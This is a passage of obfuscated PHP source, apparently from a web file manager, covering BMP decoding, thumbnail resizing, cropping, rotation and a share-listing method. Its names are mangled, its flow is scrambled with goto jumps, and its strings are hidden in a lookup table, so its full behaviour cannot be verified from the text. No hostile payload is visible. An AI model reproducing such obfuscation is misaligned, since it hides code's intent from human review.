$d¥‘—´àßÕ[$Cö­·ä„Û‹][$Fèç±ßÅ] = Action($Cä‡«Ù°Ö[1019])->shareItemInfo($f”‹²ÍØçš); } } return $d¥‘—´àßÕ; } public function listAll($dâÕÙÏ¶ Ù) { $e…ŒÕÍ³ñƒ =& $_SERVER[‚Ğ°–—î]; $f£àÒâÙåÇ = IO::info($this->pathParse[$e…ŒÕÍ³ñƒ[75]]); if (!$f£àÒâÙåÇ) { return array(); } $d‡„ø”ôèë = $this->model->listAll($dâÕÙÏ¶ Ù); foreach ($d‡„ø”ôèë as &$bÏÍˆÕª³’) { $bÏÍˆÕª³’[$e…ŒÕÍ³ñƒ[391]] = Action($e…ŒÕÍ³ñƒ[1019])->shareItemInfo($bÏÍˆÕª³’[$e…ŒÕÍ³ñƒ[391]]); } return $d‡„ø”ôèë; } } goto E™­ŸÉÎ“”; cÆùÒ¶”‰¼: class ImageGdBMP { public static function load($CÈ‡¥í÷™‹) { $FÂ­¿‹© = fopen($CÈ‡¥í÷™‹, $_SERVER[‚Ğ°–—î][1522]); if ($FÂ­¿‹© === !1) { return !1; } $Aƒº®…Ÿïî = self::loadFromStream($FÂ­¿‹©); fclose($FÂ­¿‹©); return $Aƒº®…Ÿïî; } public static function loadFromStream($eÈÚ í­‰) { $FƒÏŒÊìØ =& $_SERVER[‚Ğ°–—î]; $càâš†Ö²õ = fread($eÈÚ í­‰, 14); if ($càâš†Ö²õ === !1) { return !1; } if ($càâš†Ö²õ[0] != $FƒÏŒÊìØ[1833] || $càâš†Ö²õ[1] != $FƒÏŒÊìØ[1834]) { return !1; } $a¦ñ…¼¾ = unpack($FƒÏŒÊìØ[1835] . $FƒÏŒÊìØ[1836] . $FƒÏŒÊìØ[1837] . $FƒÏŒÊìØ[1838] . $FƒÏŒÊìØ[1839], $càâš†Ö²õ); return self::loadFromStreamAndFileHeader($eÈÚ í­‰, $a¦ñ…¼¾); } public static function loadFromStreamAndFileHeader($Bİ·¤Ú´ó¦, array $bí±ŠÊ¬ÂÍ) { goto a‚Øãİöã‘; C‹²‰ø®: if ($dÊº„‚¡ === !1) { return !1; } list(, $a¥¾¯¾äÖÙ) = unpack($b‘ò†¨”Ú‹[1840], $dÊº„‚¡); if ($a¥¾¯¾äÖÙ == 12) { goto cî‡Ç˜™”; bè¸Ô“Ç¡ò: $c”ƒÀªŒñ± = 255; goto D¡¸ù±ö; eí‡Ğ±•˜†: $bÙÇ˜åÒ¨™ = $Bƒ¡ñ¯ãê = $dÑšÆÊê¾ = $A…ğ…ƒÈã = 0; $D©Äœ…³° = 16711680; $EËÒ™ß¶… = 65280; goto bè¸Ô“Ç¡ò; cî‡Ç˜™”: $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, $a¥¾¯¾äÖÙ - 4); if ($dÊº„‚¡ === !1) { return !1; } extract(unpack($b‘ò†¨”Ú‹[1841] . $b‘ò†¨”Ú‹[1842] . $b‘ò†¨”Ú‹[1843] . $b‘ò†¨”Ú‹[1844], $dÊº„‚¡)); goto eí‡Ğ±•˜†; D¡¸ù±ö: } else { if (124 < $a¥¾¯¾äÖÙ || $a¥¾¯¾äÖÙ < 40) { return !1; } else { goto e´¥Œ¥“ÉÊ; Aª¯âÅÂ™: if ($eëËóÉ°ç« & 2147483648) { $eëËóÉ°ç« = -(~$eëËóÉ°ç« & 4294967295) - 1; } if ($bí±ŠÊ¬ÂÍ[$b‘ò†¨”Ú‹[520]] != 0) { $EÆÀÙÄÜÄ = $E°‚¤·åÉÙ == 1 || $E°‚¤·åÉÙ == 4 || $E°‚¤·åÉÙ == 8 ? ($bÙÇ˜åÒ¨™ ? $bÙÇ˜åÒ¨™ : pow(2, $E°‚¤·åÉÙ)) << 2 : 0; $E…íãŠ„á = $E«íÕ™Èé¿ ? $E«íÕ™Èé¿ : ($fæ°¸°Ïô– * $E°‚¤·åÉÙ + 31 >> 3 & ~3) * abs($d”¾–Ò—ˆ); $c¿ÈÊ—à¢ï = $bí±ŠÊ¬ÂÍ[$b‘ò†¨”Ú‹[520]] - $E…íãŠ„á - $EÆÀÙÄÜÄ - 14; if ($a¥¾¯¾äÖÙ < $c¿ÈÊ—à¢ï && 40 <= $a¥¾¯¾äÖÙ && $a¥¾¯¾äÖÙ <= 124) { $a¥¾¯¾äÖÙ = $c¿ÈÊ—à¢ï; } } if ($a¥¾¯¾äÖÙ - 40 > 0) { $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, $a¥¾¯¾äÖÙ - 40); if ($dÊº„‚¡ === !1) { return !1; } extract(unpack($b‘ò†¨”Ú‹[1854] . $b‘ò†¨”Ú‹[1855] . $b‘ò†¨”Ú‹[1856] . $b‘ò†¨”Ú‹[1857], $dÊº„‚¡ . str_repeat($b‘ò†¨”Ú‹[1858], 120))); } else { $dÑšÆÊê¾ = $D©Äœ…³° = $EËÒ™ß¶… = $c”ƒÀªŒñ± = 0; } goto e×¥¢ŠÓÜ; e´¥Œ¥“ÉÊ: $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, 36); if ($dÊº„‚¡ === !1) { return !1; } extract(unpack($b‘ò†¨”Ú‹[1845] . $b‘ò†¨”Ú‹[1846] . $b‘ò†¨”Ú‹[1843] . $b‘ò†¨”Ú‹[1847] . $b‘ò†¨”Ú‹[1848] . $b‘ò†¨”Ú‹[1849] . $b‘ò†¨”Ú‹[1850] . $b‘ò†¨”Ú‹[1851] . $b‘ò†¨”Ú‹[1852] . $b‘ò†¨”Ú‹[1853], $dÊº„‚¡)); goto d¥ÎÖè‚; e×¥¢ŠÓÜ: if (($E°‚¤·åÉÙ == 16 || $E°‚¤·åÉÙ == 24 || $E°‚¤·åÉÙ == 32) && $A…ğ…ƒÈã == 0 && $D©Äœ…³° == 0 && $EËÒ™ß¶… == 0 && $c”ƒÀªŒñ± == 0) { switch ($E°‚¤·åÉÙ) { case 16: $D©Äœ…³° = 31744; $EËÒ™ß¶… = 992; $c”ƒÀªŒñ± = 31; break; case 24: case 32: $D©Äœ…³° = 16711680; $EËÒ™ß¶… = 65280; $c”ƒÀªŒñ± = 255; break; } } goto e‡äÚ™¨à‡; d¥ÎÖè‚: if ($fæ°¸°Ïô– & 2147483648) { $fæ°¸°Ïô– = -(~$fæ°¸°Ïô– & 4294967295) - 1; } if ($d”¾–Ò—ˆ & 2147483648) { $d”¾–Ò—ˆ = -(~$d”¾–Ò—ˆ & 4294967295) - 1; } if ($eÑàÌªø÷Ü & 2147483648) { $eÑàÌªø÷Ü = -(~$eÑàÌªø÷Ü & 4294967295) - 1; } goto Aª¯âÅÂ™; e‡äÚ™¨à‡: } } goto c©¯‹×îÀ; c©¯‹×îÀ: if ($fæ°¸°Ïô– == 0 || $d”¾–Ò—ˆ == 0 || $AŠøßæõáî != 1 || ($dÑšÆÊê¾ & $D©Äœ…³°) != 0 || ($dÑšÆÊê¾ & $EËÒ™ß¶…) != 0 || ($dÑšÆÊê¾ & $c”ƒÀªŒñ±) != 0 || ($D©Äœ…³° & $EËÒ™ß¶…) != 0 || ($D©Äœ…³° & $c”ƒÀªŒñ±) != 0 || ($EËÒ™ß¶… & $c”ƒÀªŒñ±) != 0) { return !1; } if ($A…ğ…ƒÈã == 4 || $A…ğ…ƒÈã == 5) { $dÊº„‚¡ = stream_get_contents($Bİ·¤Ú´ó¦, $E«íÕ™Èé¿); if ($dÊº„‚¡ === !1) { return !1; } return imagecreatefromstring($dÊº„‚¡); } $AÇ¬ÒÒ¢„ = $fæ°¸°Ïô– * $E°‚¤·åÉÙ + 31 >> 3 & ~3; goto e¢õéÒòÈ£; e¢õéÒòÈ£: $DÃ„óÆÌ¿ = abs($d”¾–Ò—ˆ); $bìÚà·ÆÅƒ = $d”¾–Ò—ˆ > 0 ? $DÃ„óÆÌ¿ - 1 : 0; $e„ŞÆİî‹ˆ = $d”¾–Ò—ˆ > 0 ? -1 : 1; goto E¾ˆá˜½ƒÓ; a‚Øãİöã‘: $b‘ò†¨”Ú‹ =& $_SERVER[‚Ğ°–—î]; if ($bí±ŠÊ¬ÂÍ[$b‘ò†¨”Ú‹[388]] != 19778) { return !1; } $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, 4); goto C‹²‰ø®; E¾ˆá˜½ƒÓ: if ($E°‚¤·åÉÙ == 1 || $E°‚¤·åÉÙ == 4 || $E°‚¤·åÉÙ == 8) { goto e‘æˆÑ–“±; bºï£ÂºŞš: $cçù‡Å¼¥ = array(); for ($E„åŸÕùÈ¤ = 0; $E„åŸÕùÈ¤ < $aËŒç£ø•§; ++$E„åŸÕùÈ¤) { $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, $C•Œòëºë); if ($dÊº„‚¡ === !1) { imagedestroy($FĞÔé«ë); return !1; } extract(unpack($b‘ò†¨”Ú‹[1859], $dÊº„‚¡ . $b‘ò†¨”Ú‹[1858])); $cçù‡Å¼¥[] = imagecolorallocate($FĞÔé«ë, $d¨ëÀ×·˜, $E¤öâÙéµ, $dÓµ‚–ºÏ); } $c›–áÛŠĞ = 8 - $E°‚¤·åÉÙ; goto cÍµ‡Ó©œƒ; cÍµ‡Ó©œƒ: $aäìÅˆâ¹ñ = (1 << $E°‚¤·åÉÙ) - 1 << $c›–áÛŠĞ; if ($A…ğ…ƒÈã == 1 || $A…ğ…ƒÈã == 2) { $a¦Œ‘¼İ·‚ = 0; $E±¹š¥÷Ÿ‹ = $E°‚¤·åÉÙ >> 2 & 1; for (;;) { if ($a¦Œ‘¼İ·‚ < -1 || $a¦Œ‘¼İ·‚ > $fæ°¸°Ïô– || $bìÚà·ÆÅƒ < -1 || $bìÚà·ÆÅƒ > $d”¾–Ò—ˆ) { imagedestroy($FĞÔé«ë); return !1; } $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, 1); if ($dÊº„‚¡ === !1) { imagedestroy($FĞÔé«ë); return !1; } switch ($dÊº„‚¡) { case $b‘ò†¨”Ú‹[1858]: $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, 1); if ($dÊº„‚¡ === !1) { imagedestroy($FĞÔé«ë); return !1; } switch ($dÊº„‚¡) { case $b‘ò†¨”Ú‹[1858]: $bìÚà·ÆÅƒ += $e„ŞÆİî‹ˆ; $a¦Œ‘¼İ·‚ = 0; break; case $b‘ò†¨”Ú‹[1860]: $bìÚà·ÆÅƒ = 0; $a¦Œ‘¼İ·‚ = 0; break 3; case $b‘ò†¨”Ú‹[1861]: $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, 2); if ($dÊº„‚¡ === !1) { imagedestroy($FĞÔé«ë); return !1; } list(, $FÙÇÉœ˜®œ, $eŞª‡†«Û…) = unpack($b‘ò†¨”Ú‹[1862], $dÊº„‚¡); $a¦Œ‘¼İ·‚ += $FÙÇÉœ˜®œ; $bìÚà·ÆÅƒ += $eŞª‡†«Û… * $e„ŞÆİî‹ˆ; break; default: list(, $D­¶Âõƒ¢ƒ) = unpack($b‘ò†¨”Ú‹[1863], $dÊº„‚¡); $fš™”ŸÜ™¬ = ($D­¶Âõƒ¢ƒ >> $E±¹š¥÷Ÿ‹) + ($D­¶Âõƒ¢ƒ & $E±¹š¥÷Ÿ‹); $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, $fš™”ŸÜ™¬ + 1 & ~1); if ($dÊº„‚¡ === !1) { imagedestroy($FĞÔé«ë); return !1; } for ($E„åŸÕùÈ¤ = 0, $f‡‰ƒÙ÷ = 0; $E„åŸÕùÈ¤ < $D­¶Âõƒ¢ƒ; ++$E„åŸÕùÈ¤, ++$a¦Œ‘¼İ·‚, $f‡‰ƒÙ÷ += $E°‚¤·åÉÙ) { list(, $FÒö¦Ûğ­ñ) = unpack($b‘ò†¨”Ú‹[1863], $dÊº„‚¡[$f‡‰ƒÙ÷ >> 3]); $dÓµ‚–ºÏ = $f‡‰ƒÙ÷ & 7; imagesetpixel($FĞÔé«ë, $a¦Œ‘¼İ·‚, $bìÚà·ÆÅƒ, $cçù‡Å¼¥[($FÒö¦Ûğ­ñ & $aäìÅˆâ¹ñ >> $dÓµ‚–ºÏ) >> $c›–áÛŠĞ - $dÓµ‚–ºÏ]); } break; } break; default: $E•›¼©Æ” = fread($Bİ·¤Ú´ó¦, 1); if ($E•›¼©Æ” === !1) { imagedestroy($FĞÔé«ë); return !1; } list(, $Cê©›ƒƒä, $FÒö¦Ûğ­ñ) = unpack($b‘ò†¨”Ú‹[1862], $dÊº„‚¡ . $E•›¼©Æ”); for ($E„åŸÕùÈ¤ = 0, $f‡‰ƒÙ÷ = 0; $E„åŸÕùÈ¤ < $Cê©›ƒƒä; ++$E„åŸÕùÈ¤, ++$a¦Œ‘¼İ·‚, $f‡‰ƒÙ÷ += $E°‚¤·åÉÙ) { $dÓµ‚–ºÏ = $f‡‰ƒÙ÷ & 7; imagesetpixel($FĞÔé«ë, $a¦Œ‘¼İ·‚, $bìÚà·ÆÅƒ, $cçù‡Å¼¥[($FÒö¦Ûğ­ñ & $aäìÅˆâ¹ñ >> $dÓµ‚–ºÏ) >> $c›–áÛŠĞ - $dÓµ‚–ºÏ]); } break; } } } else { for ($fÙ¦ËÂó°× = 0; $fÙ¦ËÂó°× < $DÃ„óÆÌ¿; ++$fÙ¦ËÂó°×, $bìÚà·ÆÅƒ += $e„ŞÆİî‹ˆ) { $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, $AÇ¬ÒÒ¢„); if ($dÊº„‚¡ === !1) { imagedestroy($FĞÔé«ë); return !1; } $f‡‰ƒÙ÷ = 0; for ($a¦Œ‘¼İ·‚ = 0; $a¦Œ‘¼İ·‚ < $fæ°¸°Ïô–; ++$a¦Œ‘¼İ·‚, $f‡‰ƒÙ÷ += $E°‚¤·åÉÙ) { list(, $FÒö¦Ûğ­ñ) = unpack($b‘ò†¨”Ú‹[1863], $dÊº„‚¡[$f‡‰ƒÙ÷ >> 3]); $dÓµ‚–ºÏ = $f‡‰ƒÙ÷ & 7; imagesetpixel($FĞÔé«ë, $a¦Œ‘¼İ·‚, $bìÚà·ÆÅƒ, $cçù‡Å¼¥[($FÒö¦Ûğ­ñ & $aäìÅˆâ¹ñ >> $dÓµ‚–ºÏ) >> $c›–áÛŠĞ - $dÓµ‚–ºÏ]); } } } goto e‘ˆ¬óá†ñ; e‘æˆÑ–“±: $FĞÔé«ë = imagecreate($fæ°¸°Ïô–, $DÃ„óÆÌ¿); $C•Œòëºë = $a¥¾¯¾äÖÙ == 12 ? 3 : 4; $aËŒç£ø•§ = $bÙÇ˜åÒ¨™ ? $bÙÇ˜åÒ¨™ : pow(2, $E°‚¤·åÉÙ); goto bºï£ÂºŞš; e‘ˆ¬óá†ñ: } else { goto dÇÈÈ°¶†É; fìøÔœ—±³: for ($fÙ¦ËÂó°× = 0; $fÙ¦ËÂó°× < $DÃ„óÆÌ¿; ++$fÙ¦ËÂó°×, $bìÚà·ÆÅƒ += $e„ŞÆİî‹ˆ) { $dÊº„‚¡ = fread($Bİ·¤Ú´ó¦, $AÇ¬ÒÒ¢„); if ($dÊº„‚¡ === !1) { imagedestroy($FĞÔé«ë); return !1; } $f‡‰ƒÙ÷ = 0; for ($a¦Œ‘¼İ·‚ = 0; $a¦Œ‘¼İ·‚ < $fæ°¸°Ïô–; ++$a¦Œ‘¼İ·‚, $f‡‰ƒÙ÷ += $FÅ®öÕì¦ˆ) { list(, $FÒö¦Ûğ­ñ) = unpack($b‘ò†¨”Ú‹[1840], substr($dÊº„‚¡, $f‡‰ƒÙ÷, $FÅ®öÕì¦ˆ) . $b‘ò†¨”Ú‹[1864]); $eèì—÷Îà = $FÒö¦Ûğ­ñ & $dÑšÆÊê¾; $Bó‡–è¨«¥ = $FÒö¦Ûğ­ñ & $D©Äœ…³°; $FÆ›Ş‘Œ« = $FÒö¦Ûğ­ñ & $EËÒ™ß¶…; $f»ˆŸŒ™äœ = $FÒö¦Ûğ­ñ & $c”ƒÀªŒñ±; $AÓî¶–½ĞÕ = $d±Ğ¸Ûë„Ö - (($eèì—÷Îà << 7) - $eèì—÷Îà) * $c½‰ ¤ã¢ò; $d¨ëÀ×·˜ = (($Bó‡–è¨«¥ << 8) - $Bó‡–è¨«¥) * $EÉàÙ¹Ã; $E¤öâÙéµ = (($FÆ›Ş‘Œ« << 8) - $FÆ›Ş‘Œ«) * $cƒ˜Ãï¼¶; $dÓµ‚–ºÏ = (($f»ˆŸŒ™äœ << 8) - $f»ˆŸŒ™äœ) * $CËáŠ»ÈÏ—; imagesetpixel($FĞÔé«ë, $a¦Œ‘¼İ·‚, $bìÚà·ÆÅƒ, $AÓî¶–½ĞÕ << 24 | $d¨ëÀ×·˜ << 16 | $E¤öâÙéµ << 8 | $dÓµ‚–ºÏ); } } imagealphablending($FĞÔé«ë, !0); goto FåÜàŠÓ®Ô; dÇÈÈ°¶†É: $FĞÔé«ë = imagecreatetruecolor($fæ°¸°Ïô–, $DÃ„óÆÌ¿); imagealphablending($FĞÔé«ë, !1); if ($dÑšÆÊê¾) { imagesavealpha($FĞÔé«ë, !0); } goto bÕù™ã×—; CçïòœÈ·Ü: $EÉàÙ¹Ã = $D©Äœ…³° ? 1 / $D©Äœ…³° : 1; $cƒ˜Ãï¼¶ = $EËÒ™ß¶… ? 1 / $EËÒ™ß¶… : 1; $CËáŠ»ÈÏ— = $c”ƒÀªŒñ± ? 1 / $c”ƒÀªŒñ± : 1; goto fìøÔœ—±³; bÕù™ã×—: $FÅ®öÕì¦ˆ = $E°‚¤·åÉÙ >> 3; $d±Ğ¸Ûë„Ö = $dÑšÆÊê¾ ? 127 : 0; $c½‰ ¤ã¢ò = $dÑšÆÊê¾ ? 1 / $dÑšÆÊê¾ : 1; goto CçïòœÈ·Ü; FåÜàŠÓ®Ô: } return $FĞÔé«ë; goto Ağæéø¤–Ë; Ağæéø¤–Ë: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($B’¥’„‘ï´, $C³Š”ª¤õä) { goto Cß­õãë; e»Ì¬òÊ†: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto cªŸĞÀ¢Ü; Cß­õãë: $this->srcFile = $B’¥’„‘ï´; $this->echoType = $C³Š”ª¤õä; $this->im = self::image($B’¥’„‘ï´); goto fèÛ¯¿’¹Í; fèÛ¯¿’¹Í: if (!$this->im) { return !1; } $cùÔ˜ŠË¯ù = $_SERVER[‚Ğ°–—î][33]; $this->imgData = GetImageSize($B’¥’„‘ï´, $cùÔ˜ŠË¯ù); goto e»Ì¬òÊ†; cªŸĞÀ¢Ü: } public static function image($e¢¦¬äã¼) { $Eòèçâ§ÈØ =& $_SERVER[‚Ğ°–—î]; $CÊ—¾‘•Ë = $Eòèçâ§ÈØ[33]; $A ‡¬½ÂÇÉ = GetImageSize($e¢¦¬äã¼, $CÊ—¾‘•Ë); $B¯®ÊºÎÁ = !1; switch ($A ‡¬½ÂÇÉ[2]) { case IMAGETYPE_GIF: if (!function_exists($Eòèçâ§ÈØ[1865])) { break; } $B¯®ÊºÎÁ = imagecreatefromgif($e¢¦¬äã¼); break; case IMAGETYPE_JPEG: if (!function_exists($Eòèçâ§ÈØ[1866])) { break; } $B¯®ÊºÎÁ = imagecreatefromjpeg($e¢¦¬äã¼); break; case IMAGETYPE_PNG: if (!function_exists($Eòèçâ§ÈØ[1867])) { break; } $B¯®ÊºÎÁ = @imagecreatefrompng($e¢¦¬äã¼); imagesavealpha($B¯®ÊºÎÁ, !0); break; case IMAGETYPE_XBM: $B¯®ÊºÎÁ = imagecreatefromxbm($e¢¦¬äã¼); break; case IMAGETYPE_WBMP: $B¯®ÊºÎÁ = imagecreatefromwbmp($e¢¦¬äã¼); break; case IMAGETYPE_BMP: $B¯®ÊºÎÁ = imagecreatefrombmp($e¢¦¬äã¼); break; default: break; } return $B¯®ÊºÎÁ; } public static function imageSize($aĞ¬òæ×µÊ) { $EŒÑ‹¸‡ì¿ =& $_SERVER[‚Ğ°–—î]; $a¥æÖó¼³¾ = GetImageSize($aĞ¬òæ×µÊ); if (!$a¥æÖó¼³¾) { return !1; } return array($EŒÑ‹¸‡ì¿[1868] => $a¥æÖó¼³¾[0], $EŒÑ‹¸‡ì¿[1869] => $a¥æÖó¼³¾[1]); } function distortion($BÆêãÄÁÕ², $A§Í×³‰¤, $A¤± ÓÉÅí) { $c†ïñ¼°â = $this->creatImage($this->im, $A§Í×³‰¤, $A¤± ÓÉÅí, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c†ïñ¼°â, $BÆêãÄÁÕ²); } function prorate($Cø×ğà£ùÚ, $Dìµô‹²Ù, $bâàÊ¦ô½ë) { $eë´ÖŠÆ¢‚ = $Dìµô‹²Ù / $bâàÊ¦ô½ë; $AÎ‹” ë¤ï = $this->srcW / $this->srcH; if ($eë´ÖŠÆ¢‚ <= $AÎ‹” ë¤ï) { $F±‹ŞÙ‚Šê = $Dìµô‹²Ù; $fÏ¨¿¿¶¡ = $F±‹ŞÙ‚Šê * ($this->srcH / $this->srcW); } else { $fÏ¨¿¿¶¡ = $bâàÊ¦ô½ë; $F±‹ŞÙ‚Šê = $fÏ¨¿¿¶¡ * ($this->srcW / $this->srcH); } if ($this->srcW > $Dìµô‹²Ù || $this->srcH > $bâàÊ¦ô½ë) { $b¸˜ÖÔ¯Ö’ = $this->creatImage($this->im, $F±‹ŞÙ‚Šê, $fÏ¨¿¿¶¡, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($b¸˜ÖÔ¯Ö’, $Cø×ğà£ùÚ); } else { $b¸˜ÖÔ¯Ö’ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($b¸˜ÖÔ¯Ö’, $Cø×ğà£ùÚ); } } function cut($f½Şœˆ÷, $A¯°Ô—¢ …, $b‰ÄŞÃ»ÀÑ) { goto f¢ÖÔ‹ÏŒƒ; f¢ÖÔ‹ÏŒƒ: $aõÔ†›ùº² = $A¯°Ô—¢ … / $b‰ÄŞÃ»ÀÑ; $f»ôÑ¸Ğ½Ì = $this->srcW / $this->srcH; if ($aõÔ†›ùº² <= $f»ôÑ¸Ğ½Ì) { $Bì±¶œÖÚ† = $b‰ÄŞÃ»ÀÑ; $AÌ²˜¾õêô = $Bì±¶œÖÚ† * ($this->srcW / $this->srcH); } else { $AÌ²˜¾õêô = $A¯°Ô—¢ …; $Bì±¶œÖÚ† = $AÌ²˜¾õêô * ($this->srcH / $this->srcW); } goto D†ÜİÇò½Ù; D†ÜİÇò½Ù: $a™ˆµÔÕÅç = $this->creatImage($this->im, $AÌ²˜¾õêô, $Bì±¶œÖÚ†, 0, 0, 0, 0, $this->srcW, $this->srcH); $fÉÈ¿Â¿î = $this->creatImage($a™ˆµÔÕÅç, $A¯°Ô—¢ …, $b‰ÄŞÃ»ÀÑ, 0, 0, ($AÌ²˜¾õêô - $A¯°Ô—¢ …) / 2, ($Bì±¶œÖÚ† - $b‰ÄŞÃ»ÀÑ) / 2, $A¯°Ô—¢ …, $b‰ÄŞÃ»ÀÑ); imageDestroy($a™ˆµÔÕÅç); goto c˜×äºÆÅ¶; c˜×äºÆÅ¶: return $this->echoImage($fÉÈ¿Â¿î, $f½Şœˆ÷); goto BäÍˆƒŸàƒ; BäÍˆƒŸàƒ: } function backFill($aêîÆ¯¥˜—, $B²³ãŠÃ³, $A»¤‰ËÏÓ¼, $BóÌ—ëù¢ç = false, $cĞ·ââŒãà = 255, $d ßùÍÑ“ = 255, $E¡¡ù±‡±³ = 255) { goto C¦ĞË•ßÚ; C×¡®ãšîÜ: return $this->echoImage($a¾óŒÈ¸†Õ, $aêîÆ¯¥˜—); goto A‘˜ƒö Ñ; bÂ¾Ø‚ÙŠ: if ($BóÌ—ëù¢ç) { $fó•Î·’Êœ = imageColorTransparent($a¾óŒÈ¸†Õ, $fó•Î·’Êœ); $a—ù•åÇŠ¤ = $A»¤‰ËÏÓ¼ - $aèê‡ÊïÓ±; } imageFilledRectangle($a¾óŒÈ¸†Õ, 0, 0, $B²³ãŠÃ³, $A»¤‰ËÏÓ¼, $fó•Î·’Êœ); if ($this->srcW > $B²³ãŠÃ³ || $this->srcH > $A»¤‰ËÏÓ¼) { $d Òã†Ú = $this->creatImage($this->im, $C­‡îÄ÷êÍ, $aèê‡ÊïÓ±, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($C­‡îÄ÷êÍ < $B²³ãŠÃ³) { imageCopy($a¾óŒÈ¸†Õ, $d Òã†Ú, ($B²³ãŠÃ³ - $C­‡îÄ÷êÍ) / 2, 0, 0, 0, $C­‡îÄ÷êÍ, $aèê‡ÊïÓ±); } else { if ($aèê‡ÊïÓ± < $A»¤‰ËÏÓ¼) { imageCopy($a¾óŒÈ¸†Õ, $d Òã†Ú, 0, $a—ù•åÇŠ¤, 0, 0, $C­‡îÄ÷êÍ, $aèê‡ÊïÓ±); } else { imageCopy($a¾óŒÈ¸†Õ, $d Òã†Ú, 0, 0, 0, 0, $C­‡îÄ÷êÍ, $aèê‡ÊïÓ±); } } } else { imageCopyMerge($a¾óŒÈ¸†Õ, $this->im, ($B²³ãŠÃ³ - $C­‡îÄ÷êÍ) / 2, $a—ù•åÇŠ¤, 0, 0, $C­‡îÄ÷êÍ, $aèê‡ÊïÓ±, 100); } goto C×¡®ãšîÜ; fÎ¯¼ÆœâÖ: if (function_exists($_SERVER[‚Ğ°–—î][1870])) { @($a¾óŒÈ¸†Õ = imageCreateTrueColor($B²³ãŠÃ³, $A»¤‰ËÏÓ¼)); if (!$a¾óŒÈ¸†Õ) { $a¾óŒÈ¸†Õ = imageCreate($B²³ãŠÃ³, $A»¤‰ËÏÓ¼); } } else { $a¾óŒÈ¸†Õ = imageCreate($B²³ãŠÃ³, $A»¤‰ËÏÓ¼); } $a—ù•åÇŠ¤ = ($A»¤‰ËÏÓ¼ - $aèê‡ÊïÓ±) / 2; $fó•Î·’Êœ = imagecolorallocate($a¾óŒÈ¸†Õ, $cĞ·ââŒãà, $d ßùÍÑ“, $E¡¡ù±‡±³); goto bÂ¾Ø‚ÙŠ; C¦ĞË•ßÚ: $aÑÛÙŒø„ä = $B²³ãŠÃ³ / $A»¤‰ËÏÓ¼; $c£­á¤¬ë = $this->srcW / $this->srcH; if ($aÑÛÙŒø„ä <= $c£­á¤¬ë) { $C­‡îÄ÷êÍ = $B²³ãŠÃ³; $aèê‡ÊïÓ± = $C­‡îÄ÷êÍ * ($this->srcH / $this->srcW); } else { $aèê‡ÊïÓ± = $A»¤‰ËÏÓ¼; $C­‡îÄ÷êÍ = $aèê‡ÊïÓ± * ($this->srcW / $this->srcH); } goto fÎ¯¼ÆœâÖ; A‘˜ƒö Ñ: } function creatImage($aƒ‚—Á˜Ú», $dñ»óº§¿, $BØÙõ…–Š¬, $dÕ¨Õ«¿Šê, $Dº»­ÒŸ…, $cªß•Ü¤Ù™, $d°æÂ«¾“‹, $c­”ò×Ñõ, $C† Öº‘à±) { if (function_exists($_SERVER[‚Ğ°–—î][1870])) { @($B¯å÷¡ŞÛê = ImageCreateTrueColor($dñ»óº§¿, $BØÙõ…–Š¬)); @imagealphablending($B¯å÷¡ŞÛê, !1); @imagesavealpha($B¯å÷¡ŞÛê, !0); if ($B¯å÷¡ŞÛê) { imageCopyResampled($B¯å÷¡ŞÛê, $aƒ‚—Á˜Ú», $dÕ¨Õ«¿Šê, $Dº»­ÒŸ…, $cªß•Ü¤Ù™, $d°æÂ«¾“‹, $dñ»óº§¿, $BØÙõ…–Š¬, $c­”ò×Ñõ, $C† Öº‘à±); } else { $B¯å÷¡ŞÛê = ImageCreate($dñ»óº§¿, $BØÙõ…–Š¬); imageCopyResized($B¯å÷¡ŞÛê, $aƒ‚—Á˜Ú», $dÕ¨Õ«¿Šê, $Dº»­ÒŸ…, $cªß•Ü¤Ù™, $d°æÂ«¾“‹, $dñ»óº§¿, $BØÙõ…–Š¬, $c­”ò×Ñõ, $C† Öº‘à±); } } else { $B¯å÷¡ŞÛê = ImageCreate($dñ»óº§¿, $BØÙõ…–Š¬); imageCopyResized($B¯å÷¡ŞÛê, $aƒ‚—Á˜Ú», $dÕ¨Õ«¿Šê, $Dº»­ÒŸ…, $cªß•Ü¤Ù™, $d°æÂ«¾“‹, $dñ»óº§¿, $BØÙõ…–Š¬, $c­”ò×Ñõ, $C† Öº‘à±); } return $B¯å÷¡ŞÛê; } public function imgRotate($dè ¦”ŠÙ, $cŞĞ÷‹¶Ù³) { goto cøõÜ°Ï‰; dŒ‚¿ø¸¶: return $eãÚššõ£Ï; goto eÅÊšôŒÜ; cøõÜ°Ï‰: if (!$this->im || $cŞĞ÷‹¶Ù³ % 360 === 0 || !function_exists($_SERVER[‚Ğ°–—î][1871])) { return !1; } $AÍ‘Ü·èÕ = imageRotate($this->im, 360 - $cŞĞ÷‹¶Ù³, 0); $eãÚššõ£Ï = !1; goto aÕ¿ÖÏóÄ; aÕ¿ÖÏóÄ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $eãÚššõ£Ï = imagegif($AÍ‘Ü·èÕ, $dè ¦”ŠÙ); break; case IMAGETYPE_JPEG: $eãÚššõ£Ï = imagejpeg($AÍ‘Ü·èÕ, $dè ¦”ŠÙ, 100); break; case IMAGETYPE_PNG: $eãÚššõ£Ï = imagePNG($AÍ‘Ü·èÕ, $dè ¦”ŠÙ); break; default: break; } imageDestroy($AÍ‘Ü·èÕ); imageDestroy($this->im); goto dŒ‚¿ø¸¶; eÅÊšôŒÜ: } function echoImage($b–Ã£½ŸèÃ, $F­á¦ğŸ×) { goto fš¾¾÷½«Æ; BÄÆõŒö–‰: $E»îóóÛÜ´ = !1; switch ($this->echoType) { case 